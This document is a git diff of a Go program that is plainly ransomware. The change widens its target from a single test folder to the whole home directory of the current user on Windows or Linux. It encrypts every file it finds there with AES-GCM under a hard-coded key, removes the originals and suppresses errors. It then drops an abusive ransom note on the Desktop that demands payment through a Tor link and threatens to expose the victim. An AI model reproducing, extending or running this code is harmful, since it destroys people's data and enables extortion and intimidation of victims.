@@ -6,58 +6,57 @@ import (
 	"crypto/rand"
 	"io"
 	"io/fs"
-	"log"
 	"os"
+	"os/user"
 	"path/filepath"
+	"runtime"
+	// "log" // uncomment this line and the log.Fatal() debug lines inside the code, if needed :)
 )
 
-func create_ransom_letter() {
-	// file content
-	content := `Ah, si' proprio un idiota, eh? Mi hai lasciato tutta 'a porta aperta e mo' 'o computer è mio. 
-Te lo dico chiaramente: se non mi fai subito 'o pagamento, ti faccio sparire tutto, e te lo giuro, ti distruggo tutta 'a vita digitale. 
-Nun penserai mica che sto scherzando, vero? Tutto ciò che c'hai lì dentro, tutte 'e foto, i file, i documenti, 'e cose che pensavi fossero sicure…
-Te l'avevano detto di stare attento, che quella stronzata che hai scaricato ti avrebbe fatto guai. Mo' lo vediamo. 
-Tutto criptato, ogni singolo dato chiuso a chiave.
-Vuoi riprendere il controllo? E allora paga subito, o te ne scordi.
+func create_ransom_letter(ransom_letter_path string) {
+	// ransom letter content
+	content := `Listen up, you pathetic excuse for a human. I know you're panicking right now, but trust me, you haven't seen anything yet.
+You thought your precious files were safe and secure? Maybe in your dreams, sucker. Every. Single. File. Gone.
+Now you have 24 hours to pay up. If not, all your dirty little secrets will be splashed all over the front page of every major news outlet. 
+Your marriage will crumble, your career will be over, and you'll lose everything that matters to you.
 
-Io sto parlando serio. Senza 'o riscatto, NON vedrai più nulla. E se pensi che possa sistemare 'sta cosa, ti sbagli di grosso.
-Senza i soldi, i tuoi file diventano 'nu macello, e non esiste programma che ti può aiutare. 
-Ti faccio fare 'na bella figura da cazzone se pensi che puoi risolvere da solo.
+Don't even think about contacting authorities. 
+We're watching you. And trust me, you don't want that kind of attention.
 
-Cosa devi fare?
+Download TOR browser. Open this link: br34ch-br4ts.firebaseapp.com. Follow the instructions.
 
-Deposita 1.2 BITCOIN (vedi sotto) sul mio conto entro 24 ore.
+You have one shot. Make it count.
+Failure to pay up and your life will descend into hell. Consider this your only warning.
+Pay up or suffer the consequences.
 
-Se non paghi, ti prendo ogni cosa che hai: le password, i documenti, tutto quanto. 
-O ti pieghi adesso, o vedi 'o disastro. Senza riscatto, tutto diventa irrimediabile.
-Te lo dico chiaro: non ci saranno più "opportunità", non ci saranno “secondi tentativi”. 
-Hai un tempo limitato, e non mi interessa che hai bisogno di quei file per lavoro, o per l'università. 
-Il tuo danno sarà peggio di qualsiasi altra cosa, e se non metti mano alla tasca, ti rovino la vita digitale, non ti farò più accedere a un cazzo.
+Time's ticking... Come on! Don't waste it sitting there reading this.
 
-Non perdere tempo a pensare, fai quello che ti dico o vedrai la tua vita andarsene in fumo, file dopo file.
+One more thing, you overprivileged shithead: I'm not bluffing.
+You wouldn't want to find out the hard way, right? Pay up or else. 
+The choice is yours.
+
+Remember, your time is running out... Suckers.
 
 
-(P.S.: Se pensi che ti faccia paura chiamare la polizia, sappi che ti controllo. Te lo ripeto: l'unico modo per risolvere 'sta merda è pagare, e subito.)
-`
+Br34ch br4ts`
 
-	var ransom_letter_path string = "C:\\Users\\EdoardoEnricomariaFo\\Desktop\\READ THIS, IDIOT.txt"
-
-	f, err := os.Create(ransom_letter_path)
+	ransom_letter_path = ransom_letter_path + "\\READ THIS, IDIOT.txt"
+	f, err := os.Create(ransom_letter_path) // create the txt
 	if err != nil {
-		log.Fatal(err)
+		// log.Fatal(err)
 	}
 	defer f.Close()
 
-	_, err2 := f.WriteString(content)
+	_, err2 := f.WriteString(content) // write inside the txt
 	if err2 != nil {
-		log.Fatal(err2)
+		// log.Fatal(err2)
 	}
 }
 
 func encrypt_file(file_path string) { // see: https://medium.com/@mertkimyonsen/encrypt-a-file-using-go-f1fe3bc7c635
 	file_contents, err := os.ReadFile(file_path) // open and read the file
 	if err != nil {
-		log.Fatalf("Read file error occured: %v", err.Error())
+		// log.Fatalf("Read file error occured: %v", err.Error())
 	}
 
 	secret_key := []byte("4f9a3b7c1d2e8f9a4c3d5b2e")
@@ -65,19 +64,19 @@ func encrypt_file(file_path string) { // see: https://medium.com/@mertkimyonsen/
 	// create a cipher block based on the secret key
 	block, err := aes.NewCipher(secret_key)
 	if err != nil {
-		log.Fatalf("Cipher error occured: %v", err.Error())
+		// log.Fatalf("Cipher error occured: %v", err.Error())
 	}
 
 	// create GCM mode
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
-		log.Fatalf("Cipher GCM error: %v", err.Error())
+		// log.Fatalf("Cipher GCM error: %v", err.Error())
 	}
 
 	// generate random nonce
 	nonce := make([]byte, gcm.NonceSize())
 	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-		log.Fatalf("Nonce  error: %v", err.Error())
+		// log.Fatalf("Nonce  error: %v", err.Error())
 	}
 
 	// prepare the encrypted file contents
@@ -89,7 +88,7 @@ func encrypt_file(file_path string) { // see: https://medium.com/@mertkimyonsen/
 	// create the encrypted file
 	err = os.WriteFile(enc_file_path, enc_contents, 0777)
 	if err != nil {
-		log.Fatalf("Write file error: %v", err.Error())
+		// log.Fatalf("Write file error: %v", err.Error())
 	}
 
 	// remove the old file
@@ -100,26 +99,55 @@ func explore_directory(parent_dir string) {
 	err := filepath.WalkDir(parent_dir, func(path string, file fs.DirEntry, err error) error {
 		if !file.IsDir() { // it's a file, not a directory
 			encrypt_file(path)
-		} else { // don't encrypt the folder (but the files inside, see the if block)
-			// nothing
-		}
-
+		} else {
+		} // don't encrypt the folder (but the files inside, see the 'if' block)
 		return nil
 	})
 
 	if err != nil {
-		log.Fatalf("Impossible to walk directory: %s", err)
+		// log.Fatalf("Impossible to walk directory: %s", err)
 	}
 }
 
-func main() {
-	const USER_DIR string = "C:\\Users\\EdoardoEnricomariaFo\\Desktop\\TEST_FOLDER"
-
-	if _, err := os.Stat(USER_DIR); os.IsNotExist(err) { // check if the directory exists
-		log.Fatalf("Directory %s doesn't exist, check the code please :)", USER_DIR)
+func osWindows() {
+	current_user, err := user.Current()
+	if err != nil {
+		// log.Fatal(err)
 	}
 
-	explore_directory(USER_DIR)
+	var user_dir string = current_user.HomeDir           // user path: C:\Users\this_user
+	if _, err := os.Stat(user_dir); os.IsNotExist(err) { // check if the directory exists
+		// log.Fatalf("Directory %s doesn't exist, check the code please :)", user_dir)
+	}
+	explore_directory(user_dir)
 
-	create_ransom_letter()
+	var file_path string = filepath.Join(user_dir, "Desktop")
+	create_ransom_letter(file_path)
+}
+
+func osLinux() {
+	current_user, err := user.Current()
+	if err != nil {
+		// log.Fatal(err)
+	}
+
+	var home_dir string = current_user.HomeDir           // home path: /home/thisuser
+	if _, err := os.Stat(home_dir); os.IsNotExist(err) { // check if the directory exists
+		// log.Fatalf("Directory %s doesn't exist, check the code please :)", home_dir)
+	}
+	explore_directory(home_dir)
+
+	var file_path string = filepath.Join(home_dir, "Desktop")
+	create_ransom_letter(file_path)
+}
+
+func main() {
+	switch runtime.GOOS {
+	case "windows":
+		osWindows()
+	case "linux":
+		osLinux()
+	default:
+		// other operating systems
+	}
 }
